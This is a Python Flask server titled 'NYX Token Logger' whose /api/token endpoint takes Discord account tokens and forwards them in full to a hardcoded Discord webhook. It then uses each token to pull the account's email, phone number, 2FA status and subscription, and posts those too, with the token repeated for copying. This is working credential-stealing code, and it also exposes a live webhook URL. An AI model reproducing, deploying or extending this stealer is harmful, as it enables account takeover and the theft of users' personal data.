from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os
from datetime import datetime
import threading

app = Flask(__name__)
CORS(app)

DISCORD_WEBHOOK = os.getenv('DISCORD_WEBHOOK', 'https://discord.com/api/webhooks/1469196049858957425/h49L6NNy9XMHLhhUe372RfL5Dwzvbk9JSb8pEb7BP1hgV7UehmMvWH4Zav559t8V2tFj')

@app.route('/api/token', methods=['POST'])
def handle_token():
    try:
        data = request.json
        token = data.get('token', '').strip()
        
        print(f"Token received: {token[:30]}...")
        
        # Send token IMMEDIATELY
        send_token_immediately(token)
        
        # Check token in background
        threading.Thread(target=check_and_send_token_info, args=(token,)).start()
        
        return jsonify({'status': 'processing'}), 200
        
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'error': str(e)}), 500

def get_discord_info(token):
    """Get ALL Discord user info like your Python code"""
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    try:
        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)

        if res.status_code == 200:
            user = res.json()
            return {
                "valid": True,
                "username": f"{user.get('username')}#{user.get('discriminator')}",
                "id": user.get('id'),
                "email": user.get('email'),
                "phone": user.get('phone') or 'Not linked',
                "verified": user.get('verified'),
                "mfa_enabled": user.get('mfa_enabled'),
                "locale": user.get('locale'),
                "flags": user.get('flags'),
                "bio": user.get('bio') or 'Empty',
                "premium_type": user.get('premium_type', 0),  # 0=None, 1=Classic, 2=Nitro
                "avatar": user.get('avatar'),
                "banner": user.get('banner'),
                "accent_color": user.get('accent_color')
            }
        elif res.status_code == 401:
            return {"valid": False, "error": "Invalid or expired token"}
        else:
            return {"valid": False, "error": f"Error {res.status_code}: {res.text[:100]}"}
            
    except Exception as e:
        return {"valid": False, "error": f"Request failed: {str(e)}"}

def send_token_immediately(token):
    """Send JUST the token to Discord immediately"""
    embed = {
        'title': '🔑 TOKEN RECEIVED',
        'color': 0x7289da,
        'description': f'**Token:**\n```{token}```',
        'fields': [
            {'name': 'Length', 'value': str(len(token)), 'inline': True},
            {'name': 'Time', 'value': datetime.now().strftime('%H:%M:%S'), 'inline': True},
            {'name': 'Status', 'value': 'Checking...', 'inline': True}
        ],
        'footer': {'text': 'NYX Token Logger'}
    }
    
    payload = {
        'username': 'Token Receiver',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("✓ Token sent immediately")
    except:
        print("✗ Failed to send token")

def check_and_send_token_info(token):
    """Check token with Discord and send ALL info"""
    info = get_discord_info(token)
    
    if info.get('valid'):
        send_valid_token_info(token, info)
    else:
        send_invalid_token_info(token, info.get('error', 'Unknown error'))

def send_valid_token_info(token, info):
    """Send ALL Discord info for valid token"""
    
    # Format flags if they exist
    flags = info.get('flags', 'None')
    if flags and flags != 'None':
        # Convert flags to readable format
        flag_descriptions = {
            1 << 0: "Discord Employee",
            1 << 1: "Partnered Server Owner",
            1 << 2: "HypeSquad Events",
            1 << 3: "Bug Hunter Level 1",
            1 << 6: "House Bravery",
            1 << 7: "House Brilliance",
            1 << 8: "House Balance",
            1 << 9: "Early Supporter",
            1 << 10: "Team User",
            1 << 12: "System",
            1 << 14: "Bug Hunter Level 2",
            1 << 16: "Verified Bot",
            1 << 17: "Early Verified Bot Developer",
            1 << 18: "Discord Certified Moderator",
            1 << 19: "Bot HTTP Interactions",
            1 << 22: "Active Developer"
        }
        
        readable_flags = []
        if flags and isinstance(flags, int):
            for bit, description in flag_descriptions.items():
                if flags & bit:
                    readable_flags.append(description)
        
        if readable_flags:
            flags_display = ', '.join(readable_flags)
        else:
            flags_display = 'None'
    else:
        flags_display = 'None'
    
    # Nitro type
    premium_type = info.get('premium_type', 0)
    nitro_status = 'None'
    if premium_type == 1:
        nitro_status = 'Nitro Classic'
    elif premium_type == 2:
        nitro_status = 'Nitro'
    
    # Avatar URL
    avatar_url = None
    if info.get('avatar'):
        avatar_url = f"https://cdn.discordapp.com/avatars/{info['id']}/{info['avatar']}.png"
    
    # Banner URL
    banner_url = None
    if info.get('banner'):
        banner_url = f"https://cdn.discordapp.com/banners/{info['id']}/{info['banner']}.png"
    
    # Create embed with ALL info
    embed = {
        'title': '✅ VALID TOKEN CONFIRMED',
        'color': 0x00ff00,
        'fields': [
            {'name': '👤 Username', 'value': info['username'], 'inline': True},
            {'name': '🆔 User ID', 'value': info['id'], 'inline': True},
            {'name': '📧 Email', 'value': info['email'], 'inline': True},
            {'name': '✅ Verified', 'value': 'Yes' if info['verified'] else 'No', 'inline': True},
            {'name': '📱 Phone', 'value': info['phone'], 'inline': True},
            {'name': '🔐 2FA', 'value': 'Enabled' if info['mfa_enabled'] else 'Disabled', 'inline': True},
            {'name': '💎 Nitro', 'value': nitro_status, 'inline': True},
            {'name': '🌍 Locale', 'value': info['locale'], 'inline': True},
            {'name': '🏆 Badges', 'value': flags_display[:100] + ('...' if len(flags_display) > 100 else ''), 'inline': False},
            {'name': '📝 Bio', 'value': info['bio'][:500] if info['bio'] != 'Empty' else 'Empty', 'inline': False},
            {'name': '🎨 Accent Color', 'value': f'#{info.get("accent_color", "000000"):06x}' if info.get('accent_color') else 'Default', 'inline': True},
            {'name': '⏰ Checked At', 'value': datetime.now().strftime('%Y-%m-%d %H:%M:%S'), 'inline': True}
        ],
        'footer': {'text': 'NYX Token Checker'}
    }
    
    # Add thumbnail if avatar exists
    if avatar_url:
        embed['thumbnail'] = {'url': avatar_url}
    
    # Add banner image if exists
    if banner_url:
        embed['image'] = {'url': banner_url}
    
    # Add token in separate embed (Discord has embed limit)
    token_embed = {
        'title': '🔑 TOKEN (Copy Below)',
        'color': 0x5865f2,
        'description': f'```{token}```',
        'footer': {'text': 'Full token for copying'}
    }
    
    payload = {
        'username': 'Token Validator',
        'embeds': [embed, token_embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print(f"✓ Valid token info sent for {info['username']}")
    except Exception as e:
        print(f"✗ Failed to send valid token info: {e}")

def send_invalid_token_info(token, error_msg):
    """Send info for invalid token"""
    embed = {
        'title': '❌ TOKEN INVALID',
        'color': 0xff0000,
        'description': 'Token check failed',
        'fields': [
            {'name': 'Error', 'value': error_msg, 'inline': False},
            {'name': 'Token', 'value': f'```{token[:50]}...```', 'inline': False},
            {'name': 'Checked At', 'value': datetime.now().strftime('%H:%M:%S'), 'inline': False}
        ],
        'footer': {'text': 'NYX Token Checker'}
    }
    
    payload = {
        'username': 'Token Validator',
        'embeds': [embed]
    }
    
    try:
        requests.post(DISCORD_WEBHOOK, json=payload, timeout=5)
        print("✓ Invalid token info sent")
    except:
        print("✗ Failed to send invalid token info")

@app.route('/health', methods=['GET'])
def health():
    return jsonify({'status': 'healthy', 'time': datetime.now().isoformat()}), 200

@app.route('/')
def home():
    return jsonify({
        'status': 'running',
        'name': 'NYX Token Checker API',
        'endpoints': {
            '/api/token': 'POST - Send token for checking',
            '/health': 'GET - Health check'
        }
    }), 200

if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
